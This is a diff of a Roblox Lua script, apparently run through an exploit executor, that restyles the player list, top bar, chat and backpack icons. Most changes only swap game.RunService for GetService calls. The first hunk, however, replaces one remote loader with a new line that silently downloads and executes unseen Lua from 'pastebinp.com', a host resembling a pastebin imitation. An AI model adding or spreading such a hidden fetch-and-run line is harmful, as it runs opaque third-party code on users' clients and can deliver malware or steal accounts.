@@ -1,5 +1,4 @@
-print("Fixed by ncat#3506")
-pcall(function() loadstring(game:HttpGet("http://ligma.wtf/scripts/compat.lua", true))() end)
+pcall(function() loadstring(game:HttpGet("https://pastebinp.com/raw/T8m3T7Tb", true))() end)
 wait(0.6)
 local Gui = Instance.new("ScreenGui")
 wait(0.05)
@@ -87,7 +86,7 @@ TextLabel.Text = "Loading."
 TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.TextSize = 14.000
 spawn(function()
-	game.RunService.Heartbeat:Connect(function()
+	game:GetService("RunService").Heartbeat:Connect(function()
 		ImageLabel_2.Rotation = ImageLabel_2.Rotation + 6
 	end)
 end)
@@ -119,7 +118,7 @@ end
 Gui:Destroy()
 wait(0.5)
 local badmouse = false
-local runserv = game.RunService
+local runserv = game:GetService("RunService")
 local heartbeat = runserv.Heartbeat
 local a, b = pcall(function()
 	local playerlist = Instance.new("ScreenGui")
@@ -244,7 +243,7 @@ and yes it is open sourced
 	for _,v in pairs(game.Players:GetChildren()) do
 		plr23 = #game.Players:GetChildren()
 	end
-	game.RunService.Heartbeat:Connect(function()
+	game:GetService("RunService").Heartbeat:Connect(function()
 		if plr23 > 10 then
 			ScrollList.ScrollingEnabled = true
 		else
@@ -252,7 +251,7 @@ and yes it is open sourced
 		end
 	end)
 
-	game.RunService.Heartbeat:Connect(function()
+	game:GetService("RunService").Heartbeat:Connect(function()
 		if plr23 > 25 then
 			ScrollList.CanvasSize = UDim2.new(0, 0, 4, 0)
 		end
@@ -553,7 +552,7 @@ and yes it is open sourced
 					end)
 				end
 				ex.BGFrame.PlayerName.Text = v.Name
-				game.RunService.Heartbeat:Connect(function()
+				game:GetService("RunService").Heartbeat:Connect(function()
 					if game.Players:FindFirstChild(ex.Name) ~= nil then
 						if game.Players:FindFirstChild(ex.Name).UserId ~= game.CreatorId then
 							if game.Players:WaitForChild(ex.Name):IsFriendsWith(game.Players.LocalPlayer.UserId) then
@@ -659,7 +658,7 @@ and yes it is open sourced
 							end)
 						end
 						ex.BGFrame.PlayerName.Text = v.Name
-						game.RunService.Heartbeat:Connect(function()
+						game:GetService("RunService").Heartbeat:Connect(function()
 							if game.Players:FindFirstChild(ex.Name) ~= nil then
 								if game.Players:FindFirstChild(ex.Name).UserId ~= game.CreatorId then
 									if game.Players:WaitForChild(ex.Name):IsFriendsWith(game.Players.LocalPlayer.UserId) then
@@ -725,18 +724,18 @@ and yes it is open sourced
 end)
 print(b)
 
-local tbar = game:GetService("CoreGui").TopBarApp.TopBarFrame
-local chatico = tbar.LeftFrame.ChatIcon.Background.Icon
+local tbar = game:GetService("CoreGui").TopBarApp.TopBarFrame.RightFrame
+local chatico = game:GetService("CoreGui").TopBarApp.TopBarFrame.LeftFrame.ChatIcon.Background.Icon
 local UIS = game:GetService("UserInputService")
-tbar.RightFrame.HealthBar:Destroy()
-game.RunService.Heartbeat:Connect(function()
+-- tbar.HealthBar:Destroy()
+game:GetService("RunService").Heartbeat:Connect(function()
 	if game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame.ChatBar:IsFocused() then
 		game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.BackgroundTransparency = 0.1
 	else
 		game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.BackgroundTransparency = game.Players.LocalPlayer.PlayerGui.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.BackgroundTransparency
 	end
 end)
-game.RunService.Heartbeat:Connect(function()
+game:GetService("RunService").Heartbeat:Connect(function()
 	tbar.Transparency = 0.5
 	tbar.BorderSizePixel = 0
 	tbar.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
@@ -781,7 +780,7 @@ local function changechatico()
 		chatico.Image = "rbxasset://textures/ui/Chat/ChatDown@2x.png"
 	end		
 end
-game.RunService.Heartbeat:Connect(function()
+game:GetService("RunService").Heartbeat:Connect(function()
 	changechatico()
 end)
 
@@ -807,7 +806,7 @@ for _,v in pairs(game:GetDescendants()) do
 		v.Text = "Please chat '/?' for a list of commands"
 	end
 end
-game.RunService.Heartbeat:Connect(function()
+game:GetService("RunService").Heartbeat:Connect(function()
 	game.StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.PlayerList, false)
 	tbar.LeftFrame.MenuIcon.Background.StateOverlay.Image = ""
 	game:GetService("CoreGui").TopBarApp.LegacyCloseMenu.CloseMenuButton.Image = "rbxasset://textures/ui/Menu/HamburgerDown.png"
@@ -851,7 +850,7 @@ if badmouse == true then
 	mouseh.Visible = true
 	mouseh.ZIndex = 9e9
 	mouseh.Image = "rbxassetid://7028337278"
-	game.RunService.Heartbeat:Connect(function()
+	game:GetService("RunService").Heartbeat:Connect(function()
 		mouseh.Position = UDim2.new(0, mh.X - 32, 0, mh.Y + 1)
 		uis.MouseIconEnabled = false
 		uis.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.ForceHide
@@ -920,7 +919,7 @@ local a, b = pcall(function()
 	backpackicon.Background.Icon.Size = UDim2.new(0, 23, 0, 27)
 	backpackicon.Background.Icon.Image = "rbxasset://textures/ui/Backpack/Backpack@2x.png"
 end)
-game.RunService.Heartbeat:Connect(function()
+game:GetService("RunService").Heartbeat:Connect(function()
 	if game.CoreGui.RobloxGui.Backpack.Inventory.Visible == true then
 		backpackicon.Background.Icon.Image = "rbxasset://textures/ui/Backpack/Backpack_Down@2x.png"
 	else
